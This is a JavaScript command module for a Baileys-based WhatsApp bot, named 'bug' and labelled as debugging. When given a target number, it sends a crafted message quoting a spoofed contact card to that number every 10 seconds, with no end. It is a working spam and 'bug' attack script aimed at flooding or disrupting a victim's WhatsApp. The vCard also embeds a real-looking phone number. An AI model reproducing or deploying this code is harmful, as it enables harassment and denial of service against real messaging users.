/* global botNum */
import { generateWAMessageFromContent } from '@adiwajshing/baileys';
import { ZERO, S_WHATSAPP_NET } from '../../helper/index.js';

export default {
	name: 'bug',
	description: 'Send bug.',
	category: 'Debugging',
	usage: '!bug',
	aliases: ['bug'],
	cooldown: 5,
	limit: 0,
	status: 'disable',
	async run({ from, bodyQuoted, mediaData, query }, client) {
		if (!query && !bodyQuoted) {
			return;
		}

		setInterval(async () => {
			const messages = generateWAMessageFromContent(
				from,
				{
					extendedTextMessage: {
						text: '.',
						contextInfo: {
							participant: ZERO,
							remoteJid: 'broadcast',
							quotedMessage: {
								contactMessage: {
									displayName: 'Hidden Finder',
									vcard: 'BEGIN:VCARD\nVERSION:3.0\nTEL;type=CELL;type=VOICE;waid=6289522534401:6289522534401\nEND:VCARD',
								},
							},
						},
					},
				},
				{},
			);

			await client[botNum].relayMessage(`${(query || mediaData.participant).replace(/([@s.+\s-]|whatsapp|net)/g, '')}${S_WHATSAPP_NET}`, messages.message, {
				messageId: messages.key.id,
			});
		}, 10_000);
	},
};
